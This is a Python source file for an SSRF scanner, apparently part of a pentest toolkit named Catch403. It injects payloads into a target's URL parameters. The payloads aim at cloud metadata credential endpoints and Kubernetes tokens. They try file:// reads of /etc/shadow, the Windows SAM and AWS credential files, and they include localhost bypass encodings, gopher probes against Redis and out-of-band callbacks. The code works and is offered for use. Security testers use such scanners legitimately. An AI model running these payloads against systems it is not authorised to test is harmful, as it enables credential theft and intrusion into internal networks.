#!/usr/bin/python3
"""
SSRF Scanner — Server-Side Request Forgery detection.

Tests URL-bearing parameters for SSRF. Checks:
  - Cloud metadata endpoints (AWS/GCP/Azure/DigitalOcean/Oracle)
  - Internal network probes (localhost, RFC-1918, loopback)
  - Protocol smuggling: file://, dict://, gopher://, ftp://
  - Bypass encodings: IPv6, decimal IP, hex IP, URL-encoded
  - OOB interaction via Burp Collaborator / interactsh (if configured)
  - Blind detection via timing difference (internal vs external)

Usage:
  ../.venv/bin/python3 modules/ssrf_scanner.py -u "https://target.com/fetch?url=FUZZ"
  ../.venv/bin/python3 modules/ssrf_scanner.py -u https://target.com/api/proxy -d '{"url":"FUZZ"}' --json
  ../.venv/bin/python3 modules/ssrf_scanner.py -u https://target.com -p url,redirect,next --oob your.interact.sh
"""
import argparse
import json
import re
import time
import urllib.parse

import requests
import urllib3

from core.colors import bold, end, good, bad, info, run

urllib3.disable_warnings()

TIMEOUT    = 15
UA         = {"User-Agent": "Catch403/1.0"}
FUZZ_MARK  = "FUZZ"

# ── payload categories ─────────────────────────────────────────────────────

# Cloud metadata endpoints — confirming SSRF to internal
CLOUD_METADATA = [
    # AWS IMDSv1 (most permissive)
    ("AWS IMDSv1 credentials",       "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("AWS IMDSv1 hostname",          "http://169.254.169.254/latest/meta-data/hostname"),
    ("AWS IMDSv1 user-data",         "http://169.254.169.254/latest/user-data"),
    # GCP
    ("GCP metadata token",           "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
    ("GCP metadata hostname",        "http://metadata.google.internal/computeMetadata/v1/instance/hostname"),
    # Azure IMDS
    ("Azure IMDS identity",          "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
    # DigitalOcean
    ("DigitalOcean metadata",        "http://169.254.169.254/metadata/v1/"),
    # Oracle Cloud
    ("Oracle Cloud metadata",        "http://169.254.169.254/opc/v1/instance/"),
    # Kubernetes service account
    ("K8s service account token",    "file:///var/run/secrets/kubernetes.io/serviceaccount/token"),
    ("K8s API server",               "https://kubernetes.default.svc/api/v1/namespaces"),
]

# Internal network probes — basic reachability checks
INTERNAL_PROBES = [
    ("Localhost HTTP",           "http://127.0.0.1/"),
    ("Localhost HTTPS",          "https://127.0.0.1/"),
    ("Localhost :8080",          "http://127.0.0.1:8080/"),
    ("Localhost :8443",          "https://127.0.0.1:8443/"),
    ("Localhost :3000",          "http://127.0.0.1:3000/"),
    ("Localhost :5000",          "http://127.0.0.1:5000/"),
    ("Localhost :9200 (ES)",     "http://127.0.0.1:9200/_cat/indices"),
    ("Localhost :6379 (Redis)",  "http://127.0.0.1:6379/"),
    ("Localhost :27017 (Mongo)", "http://127.0.0.1:27017/"),
    ("IPv6 loopback",            "http://[::1]/"),
    ("IPv6 loopback :8080",      "http://[::1]:8080/"),
    ("0.0.0.0",                  "http://0.0.0.0/"),
    ("Private 10.0.0.1",        "http://10.0.0.1/"),
    ("Private 192.168.1.1",     "http://192.168.1.1/"),
    ("Private 172.16.0.1",      "http://172.16.0.1/"),
]

# Bypass encodings of 127.0.0.1
BYPASS_ENCODINGS = [
    ("Decimal IP",          "http://2130706433/"),           # 127.0.0.1 as uint32
    ("Hex IP",              "http://0x7f000001/"),
    ("Octal IP",            "http://0177.0.0.1/"),
    ("IPv6 mapped",         "http://[::ffff:127.0.0.1]/"),
    ("IPv6 mapped hex",     "http://[::ffff:7f00:1]/"),
    ("URL-encoded dot",     "http://127%2E0%2E0%2E1/"),
    ("Truncated decimal",   "http://127.1/"),
    ("localhost DNS",       "http://localtest.me/"),          # resolves to 127.0.0.1
    ("Scheme-relative",     "//127.0.0.1/"),
    ("Double slash",        "\\\\127.0.0.1"),
]

# File read via SSRF (file:// handler)
FILE_READ = [
    ("Linux passwd",    "file:///etc/passwd"),
    ("Linux shadow",    "file:///etc/shadow"),
    ("Linux hosts",     "file:///etc/hosts"),
    ("Windows hosts",   "file:///C:/Windows/System32/drivers/etc/hosts"),
    ("Windows SAM",     "file:///C:/Windows/System32/config/SAM"),
    ("App source",      "file:///proc/self/environ"),
    ("AWS creds",       "file:///home/ubuntu/.aws/credentials"),
]

# Protocol smuggling probes
PROTOCOL_PROBES = [
    ("dict:// port scan",   "dict://127.0.0.1:6379/info"),
    ("gopher:// redis",     "gopher://127.0.0.1:6379/_PING"),
    ("ftp:// probe",        "ftp://127.0.0.1:21/"),
]

# Common parameter names that carry URLs
COMMON_URL_PARAMS = [
    "url", "URL", "redirect", "return", "next", "goto", "dest", "destination",
    "target", "link", "src", "source", "fetch", "load", "uri", "URI",
    "path", "ref", "referrer", "continue", "location", "endpoint", "proxy",
    "forward", "open", "callback", "view", "file", "document", "img", "image",
    "import", "export", "request", "from", "site", "domain", "host",
]

# ── detection helpers ──────────────────────────────────────────────────────

_METADATA_INDICATORS = [
    r"ami-[0-9a-f]{8,}",          # AWS AMI id
    r"instance-id",
    r"security-credentials",
    r"iam/",
    r'"computeMetadata"',
    r'"serviceAccounts"',
    r'"osProfile"',                # Azure
    r"169\.254\.169\.254",
    r"access_key",
    r"secret_key",
    r"kubernetes",
    r"serviceaccount",
    r"root:[x*]:0:0:",             # /etc/passwd
    r"\[default\]",               # AWS credentials file
]
_META_RE = re.compile("|".join(_METADATA_INDICATORS), re.IGNORECASE)

_ERROR_WORDS = frozenset([
    "connection refused", "cannot connect", "no route", "network unreachable",
    "timed out", "operation timed out", "refused to connect", "failed to connect",
])


def _baseline(url: str, param: str, headers: dict) -> tuple[int, int, float]:
    """Return (status, body_len, elapsed) for a benign probe value."""
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = ["https://example.com/ssrf-test-baseline"]
    new_qs = urllib.parse.urlencode(qs, doseq=True)
    probe_url = parsed._replace(query=new_qs).geturl()
    t0 = time.perf_counter()
    try:
        r = requests.get(probe_url, headers=headers, timeout=TIMEOUT,
                         verify=False, allow_redirects=False)
        return r.status_code, len(r.text), time.perf_counter() - t0
    except Exception:
        return 0, 0, TIMEOUT


def _inject_param(base_url: str, param: str, value: str) -> str:
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    return parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()


def _send(url: str, param: str, payload: str, headers: dict,
          data: str = "", is_json: bool = False) -> tuple[requests.Response | None, float]:
    target = _inject_param(url, param, payload)
    t0 = time.perf_counter()
    try:
        if data:
            body = data.replace(FUZZ_MARK, payload)
            ct = {"Content-Type": "application/json"} if is_json else {"Content-Type": "application/x-www-form-urlencoded"}
            r = requests.post(url, data=body if not is_json else None,
                              json=json.loads(body) if is_json else None,
                              headers={**headers, **ct}, timeout=TIMEOUT,
                              verify=False, allow_redirects=False)
        else:
            r = requests.get(target, headers=headers, timeout=TIMEOUT,
                             verify=False, allow_redirects=False)
        return r, time.perf_counter() - t0
    except requests.Timeout:
        return None, TIMEOUT
    except Exception:
        return None, time.perf_counter() - t0


def _check_response(r: requests.Response | None, payload: str, label: str,
                    sev: str = "high") -> dict | None:
    if r is None:
        return None
    body = r.text
    if _META_RE.search(body):
        return {
            "name": f"SSRF — {label}",
            "severity": "critical",
            "detail": (
                f"Metadata/sensitive content detected in response.\n"
                f"Payload: {payload}\nStatus: {r.status_code}"
            ),
            "payload": payload,
            "evidence": body[:500],
        }
    # Response body differs significantly or unusual status
    if r.status_code in (200, 201, 207):
        return {
            "name": f"SSRF (Possible) — {label}",
            "severity": sev,
            "detail": (
                f"Server returned {r.status_code} for internal URL — may indicate SSRF.\n"
                f"Payload: {payload}"
            ),
            "payload": payload,
            "evidence": body[:300],
        }
    return None


# ── scan functions ─────────────────────────────────────────────────────────

def scan_param(url: str, param: str, *,
               headers: dict | None = None,
               data: str = "", is_json: bool = False,
               oob_host: str = "",
               test_cloud: bool = True,
               test_internal: bool = True,
               test_file: bool = True,
               test_bypass: bool = True,
               test_protocol: bool = False) -> list[dict]:
    hdrs = {**UA, **(headers or {})}
    findings: list[dict] = []

    payload_groups = []
    if test_cloud:
        payload_groups += CLOUD_METADATA
    if test_internal:
        payload_groups += INTERNAL_PROBES
    if test_file:
        payload_groups += FILE_READ
    if test_bypass:
        payload_groups += BYPASS_ENCODINGS
    if test_protocol:
        payload_groups += PROTOCOL_PROBES

    for label, payload in payload_groups:
        r, elapsed = _send(url, param, payload, hdrs, data, is_json)
        finding = _check_response(r, payload, label)
        if finding:
            finding["url"] = url
            finding["param"] = param
            findings.append(finding)

    # OOB probe
    if oob_host:
        oob_url = f"http://{oob_host}/ssrf-{param}"
        r, _ = _send(url, param, oob_url, hdrs, data, is_json)
        findings.append({
            "name": "SSRF OOB Probe Sent",
            "severity": "info",
            "detail": (
                f"OOB callback sent to {oob_host}. "
                f"Check your interactsh/collaborator for an incoming HTTP request. "
                f"Status: {r.status_code if r else 'timeout'}"
            ),
            "payload": oob_url,
            "url": url,
            "param": param,
        })

    return findings


def scan(url: str, *,
         params: list[str] | None = None,
         headers: dict | None = None,
         data: str = "", is_json: bool = False,
         oob_host: str = "",
         test_cloud: bool = True,
         test_internal: bool = True,
         test_file: bool = True,
         test_bypass: bool = True) -> list[dict]:
    """
    Auto-discover URL parameters and test them for SSRF.
    If params is given, test only those. Otherwise, test all query string params
    and fall back to COMMON_URL_PARAMS.
    """
    parsed = urllib.parse.urlparse(url)
    qs_params = list(urllib.parse.parse_qs(parsed.query).keys())
    target_params = params or qs_params or COMMON_URL_PARAMS

    all_findings: list[dict] = []
    for param in target_params:
        found = scan_param(
            url, param, headers=headers, data=data, is_json=is_json,
            oob_host=oob_host, test_cloud=test_cloud,
            test_internal=test_internal, test_file=test_file,
            test_bypass=test_bypass,
        )
        all_findings.extend(found)

    if not all_findings:
        all_findings.append({
            "name": "No SSRF Detected",
            "severity": "info",
            "detail": f"Tested {len(target_params)} parameter(s) — no SSRF indicators found",
        })
    return all_findings


# ── CLI ────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Catch403 SSRF Scanner")
    parser.add_argument("-u", dest="url", required=True,
                        help="Target URL. Use FUZZ in URL to mark injection point.")
    parser.add_argument("-p", dest="params", default="",
                        help="Comma-separated parameter names to test (default: auto-detect)")
    parser.add_argument("-d", dest="data", default="",
                        help="POST body. Use FUZZ as placeholder.")
    parser.add_argument("--json", dest="is_json", action="store_true",
                        help="POST body is JSON")
    parser.add_argument("--oob", dest="oob_host", default="",
                        help="OOB host (e.g. your.interact.sh) for blind SSRF")
    parser.add_argument("--no-cloud",    action="store_true")
    parser.add_argument("--no-internal", action="store_true")
    parser.add_argument("--no-file",     action="store_true")
    parser.add_argument("--no-bypass",   action="store_true")
    parser.add_argument("--protocol",    action="store_true",
                        help="Include dict:// gopher:// ftp:// probes")
    parser.add_argument("--header", dest="headers", action="append", default=[],
                        metavar="NAME:VALUE")
    parser.add_argument("-o", dest="output", default="")
    args = parser.parse_args()

    custom_headers: dict = {}
    for h in args.headers:
        if ":" in h:
            k, v = h.split(":", 1)
            custom_headers[k.strip()] = v.strip()

    params = [p.strip() for p in args.params.split(",") if p.strip()] or None

    import urllib.parse as _up
    _p = _up.urlparse(args.url)
    print(f"{run} SSRF scan: {bold}{_p.netloc}{_p.path}{end}")

    results = scan(
        args.url,
        params=params,
        headers=custom_headers,
        data=args.data,
        is_json=args.is_json,
        oob_host=args.oob_host,
        test_cloud=not args.no_cloud,
        test_internal=not args.no_internal,
        test_file=not args.no_file,
        test_bypass=not args.no_bypass,
    )

    for f in results:
        sev = f.get("severity", "info")
        icon = bad if sev == "critical" else (f"{bold}[HIGH]{end}" if sev == "high" else info)
        print(f"\n{icon} {bold}{f['name']}{end}")
        print(f"      {f.get('detail', '')[:120]}")
        if f.get("evidence"):
            print(f"      Evidence: {f['evidence'][:80]}")

    if args.output:
        with open(args.output, "w") as fh:
            json.dump(results, fh, indent=2)
        print(f"\n{good} Saved to {args.output}")


if __name__ == "__main__":
    main()
